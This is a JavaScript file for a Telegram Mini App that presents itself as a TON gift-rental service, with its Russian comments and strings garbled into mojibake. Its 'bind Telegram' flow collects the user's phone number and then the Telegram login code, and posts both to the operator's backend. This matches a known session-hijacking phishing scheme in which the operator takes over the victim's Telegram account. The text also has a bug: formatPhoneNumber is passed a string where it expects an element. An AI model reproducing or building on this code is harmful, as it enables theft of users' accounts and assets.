// –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
let userData = {};
let gifts = [];

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
function initApp() {
    const tg = window.Telegram.WebApp;
    
    // –†–∞—Å—à–∏—Ä—è–µ–º –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω
    tg.expand();
    
    // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    if (tg.initDataUnsafe.user) {
        const user = tg.initDataUnsafe.user;
        userData = {
            id: user.id,
            firstName: user.first_name,
            lastName: user.last_name,
            username: user.username
        };
        updateProfile();
    }
    
    // –ó–∞–≥—Ä—É–∂–∞–µ–º –ø–æ–¥–∞—Ä–∫–∏
    loadGifts();
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–∞—Ç—É—Å –ø—Ä–∏–≤—è–∑–∫–∏ Telegram
    checkTelegramStatus();
}

// –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –≤–∫–ª–∞–¥–æ–∫
function switchTab(tabName) {
    // –°–∫—Ä—ã–≤–∞–µ–º –≤—Å–µ –≤–∫–ª–∞–¥–∫–∏
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.remove('active');
    });
    
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –≤—ã–±—Ä–∞–Ω–Ω—É—é –≤–∫–ª–∞–¥–∫—É
    document.getElementById(tabName).classList.add('active');
    
    // –û–±–Ω–æ–≤–ª—è–µ–º –Ω–∞–≤–∏–≥–∞—Ü–∏—é
    document.querySelectorAll('.nav-item').forEach(item => {
        item.classList.remove('active');
    });
    event.currentTarget.classList.add('active');
}

// –ó–∞–≥—Ä—É–∑–∫–∞ –ø–æ–¥–∞—Ä–∫–æ–≤
async function loadGifts() {
    try {
        const response = await fetch(`${CONFIG.API_URL}/api/gifts`);
        gifts = await response.json();
        renderGifts();
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –ø–æ–¥–∞—Ä–∫–æ–≤:', error);
    }
}

// –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤
function renderGifts() {
    const container = document.getElementById('giftsList');
    container.innerHTML = '';
    
    gifts.forEach(gift => {
        const giftElement = `
            <div class="gift-card" onclick="rentGift(${gift.id})">
                <img src="${gift.image}" alt="${gift.model}" class="gift-image" 
                     onerror="this.src='https://via.placeholder.com/150/001f3f/0074D9?text=GIFT'">
                <div class="gift-name">${gift.model}</div>
                <div class="gift-price">${gift.price} TON</div>
                <div class="gift-period">${gift.days} –¥–Ω–µ–π</div>
            </div>
        `;
        container.innerHTML += giftElement;
    });
}

// –ê—Ä–µ–Ω–¥–∞ –ø–æ–¥–∞—Ä–∫–∞
function rentGift(giftId) {
    const gift = gifts.find(g => g.id === giftId);
    if (!gift) return;
    
    const tg = window.Telegram.WebApp;
    tg.showPopup({
        title: `–ê—Ä–µ–Ω–¥–∞ ${gift.model}`,
        message: `–°—Ç–æ–∏–º–æ—Å—Ç—å: ${gift.price} TON\n–°—Ä–æ–∫: ${gift.days} –¥–Ω–µ–π`,
        buttons: [
            {id: 'confirm', type: 'default', text: '–ê—Ä–µ–Ω–¥–æ–≤–∞—Ç—å'},
            {type: 'cancel', text: '–û—Ç–º–µ–Ω–∞'}
        ]
    }, function(buttonId) {
        if (buttonId === 'confirm') {
            processRent(giftId);
        }
    });
}

// –ü—Ä–æ—Ü–µ—Å—Å –∞—Ä–µ–Ω–¥—ã
async function processRent(giftId) {
    try {
        const response = await fetch(`${CONFIG.API_URL}/api/rent`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                giftId: giftId,
                userId: userData.id
            })
        });
        
        const result = await response.json();
        if (result.success) {
            window.Telegram.WebApp.showAlert('üéâ –ü–æ–¥–∞—Ä–æ–∫ —É—Å–ø–µ—à–Ω–æ –∞—Ä–µ–Ω–¥–æ–≤–∞–Ω!');
            updateProfile();
        }
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –∞—Ä–µ–Ω–¥—ã:', error);
        window.Telegram.WebApp.showAlert('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∞—Ä–µ–Ω–¥–µ');
    }
}

// –ü—Ä–∏–≤—è–∑–∫–∞ Telegram
function bindTelegram() {
    const tg = window.Telegram.WebApp;
    
    tg.showPopup({
        title: '–ü—Ä–∏–≤—è–∑–∫–∞ Telegram',
        message: '–î–ª—è –ø—Ä–∏–≤—è–∑–∫–∏ –∞–∫–∫–∞—É–Ω—Ç–∞ –Ω–∞–º –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è –¥–æ—Å—Ç—É–ø –∫ –≤–∞—à–µ–º—É –Ω–æ–º–µ—Ä—É —Ç–µ–ª–µ—Ñ–æ–Ω–∞',
        buttons: [
            {id: 'share_phone', type: 'default', text: 'üì± –ü–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º'},
            {type: 'cancel', text: '–û—Ç–º–µ–Ω–∞'}
        ]
    }, function(buttonId) {
        if (buttonId === 'share_phone') {
            requestPhoneNumber();
        }
    });
}

// –ó–∞–ø—Ä–æ—Å –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
function requestPhoneNumber() {
    const tg = window.Telegram.WebApp;
    
    tg.requestContact((contact) => {
        if (contact) {
            startTelegramAuth(contact.phone_number);
        }
    });
}

// –ó–∞–ø—É—Å–∫ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ Telegram
function startTelegramAuth(phoneNumber) {
    showAuthStep(1, phoneNumber);
    
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ –±—ç–∫–µ–Ω–¥
    fetch(`${CONFIG.API_URL}/auth/request`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: phoneNumber })
    })
    .then(response => response.json())
    .then(data => {
        if (data.requires_code) {
            showCodeInput();
        }
    });
}

// –ü–æ–∫–∞–∑ —à–∞–≥–æ–≤ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
function showAuthStep(step, phone) {
    const authSteps = document.getElementById('authSteps');
    
    if (step === 1) {
        authSteps.innerHTML = `
            <div class="auth-step">
                <strong>–®–∞–≥ 1: –ù–æ–º–µ—Ä –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω</strong>
                <p>–ù–æ–º–µ—Ä: ${formatPhoneNumber(phone)}</p>
                <p>–û–∂–∏–¥–∞–µ–º –∫–æ–¥ –∏–∑ Telegram...</p>
            </div>
        `;
    }
    
    openModal('telegramAuthModal');
}

// –ü–æ–∫–∞–∑ –≤–≤–æ–¥–∞ –∫–æ–¥–∞
function showCodeInput() {
    const authSteps = document.getElementById('authSteps');
    authSteps.innerHTML += `
        <div class="auth-step">
            <strong>–®–∞–≥ 2: –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥</strong>
            <p>–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram</p>
            <div class="code-input">
                <button class="code-btn" onclick="addCode('1')">1</button>
                <button class="code-btn" onclick="addCode('2')">2</button>
                <button class="code-btn" onclick="addCode('3')">3</button>
                <button class="code-btn" onclick="addCode('4')">4</button>
                <button class="code-btn" onclick="addCode('5')">5</button>
                <button class="code-btn" onclick="addCode('6')">6</button>
                <button class="code-btn" onclick="addCode('7')">7</button>
                <button class="code-btn" onclick="addCode('8')">8</button>
                <button class="code-btn" onclick="addCode('9')">9</button>
                <button class="code-btn" onclick="clearCode()">C</button>
                <button class="code-btn" onclick="addCode('0')">0</button>
                <button class="code-btn" onclick="submitCode()">‚úì</button>
            </div>
            <div id="codeDisplay" style="text-align: center; font-size: 18px; margin: 10px 0;"></div>
        </div>
    `;
}

let currentCode = '';

function addCode(digit) {
    if (currentCode.length < 6) {
        currentCode += digit;
        updateCodeDisplay();
    }
}

function clearCode() {
    currentCode = '';
    updateCodeDisplay();
}

function updateCodeDisplay() {
    const display = document.getElementById('codeDisplay');
    if (display) {
        display.textContent = '‚Ä¢'.repeat(currentCode.length);
    }
}

async function submitCode() {
    if (currentCode.length < 5) {
        window.Telegram.WebApp.showAlert('–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –∫–æ–¥');
        return;
    }
    
    try {
        const response = await fetch(`${CONFIG.API_URL}/auth/verify`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ code: currentCode })
        });
        
        const result = await response.json();
        if (result.success) {
            window.Telegram.WebApp.showAlert('‚úÖ Telegram —É—Å–ø–µ—à–Ω–æ –ø—Ä–∏–≤—è–∑–∞–Ω!');
            closeModal('telegramAuthModal');
            checkTelegramStatus();
        } else {
            window.Telegram.WebApp.showAlert('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥');
            clearCode();
        }
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏:', error);
    }
}

// –†–∞–±–æ—Ç–∞ —Å –Ω–æ–º–µ—Ä–æ–º —Ç–µ–ª–µ—Ñ–æ–Ω–∞
function showPhoneModal() {
    openModal('phoneModal');
}

function formatPhoneNumber(input) {
    let value = input.value.replace(/\D/g, '');
    
    if (value.startsWith('7') || value.startsWith('8')) {
        value = '7' + value.substring(1);
        document.getElementById('countryFlag').textContent = 'üá∑üá∫';
    }
    
    let formattedValue = '+';
    
    if (value.length > 0) {
        formattedValue += value.substring(0, 1);
    }
    if (value.length > 1) {
        formattedValue += ' (' + value.substring(1, 4);
    }
    if (value.length > 4) {
        formattedValue += ') ' + value.substring(4, 7);
    }
    if (value.length > 7) {
        formattedValue += '-' + value.substring(7, 9);
    }
    if (value.length > 9) {
        formattedValue += '-' + value.substring(9, 11);
    }
    
    input.value = formattedValue;
}

async function savePhoneNumber() {
    const phone = document.getElementById('phoneInput').value;
    
    if (!phone || phone.length < 10) {
        window.Telegram.WebApp.showAlert('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
        return;
    }
    
    try {
        const response = await fetch(`${CONFIG.API_URL}/api/save-phone`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                userId: userData.id,
                phone: phone
            })
        });
        
        const result = await response.json();
        if (result.success) {
            window.Telegram.WebApp.showAlert('‚úÖ –ù–æ–º–µ—Ä —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω!');
            closeModal('phoneModal');
            updateProfile();
        }
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω–æ–º–µ—Ä–∞:', error);
    }
}

// –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø—Ä–æ—Ñ–∏–ª—è
async function updateProfile() {
    if (!userData.id) return;
    
    try {
        const response = await fetch(`${CONFIG.API_URL}/api/user/${userData.id}`);
        const userInfo = await response.json();
        
        document.getElementById('userName').textContent = 
            userData.firstName + (userData.lastName ? ' ' + userData.lastName : '');
        document.getElementById('balance').textContent = userInfo.balance + ' TON';
        document.getElementById('rentedGifts').textContent = userInfo.rentedGifts || 0;
        document.getElementById('myGifts').textContent = userInfo.myGifts || 0;
        
        if (userInfo.phone) {
            document.getElementById('phoneDisplay').textContent = userInfo.phone;
        }
        
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –ø—Ä–æ—Ñ–∏–ª—è:', error);
    }
}

// –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ Telegram
async function checkTelegramStatus() {
    if (!userData.id) return;
    
    try {
        const response = await fetch(`${CONFIG.API_URL}/api/telegram-status/${userData.id}`);
        const status = await response.json();
        
        const statusElement = document.getElementById('telegramStatus');
        const buttonElement = document.getElementById('bindTelegramBtn');
        
        if (status.connected) {
            statusElement.textContent = '‚úÖ –ü—Ä–∏–≤—è–∑–∞–Ω';
            statusElement.style.color = '#00ff00';
            buttonElement.style.display = 'none';
        } else {
            statusElement.textContent = '‚ùå –ù–µ –ø—Ä–∏–≤—è–∑–∞–Ω';
            statusElement.style.color = '#ff4444';
            buttonElement.style.display = 'block';
        }
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—Ç–∞—Ç—É—Å–∞:', error);
    }
}

// –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º–æ–¥–∞–ª—å–Ω—ã–º–∏ –æ–∫–Ω–∞–º–∏
function openModal(modalId) {
    document.getElementById(modalId).style.display = 'flex';
}

function closeModal(modalId) {
    document.getElementById(modalId).style.display = 'none';
}

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
document.addEventListener('DOMContentLoaded', initApp);
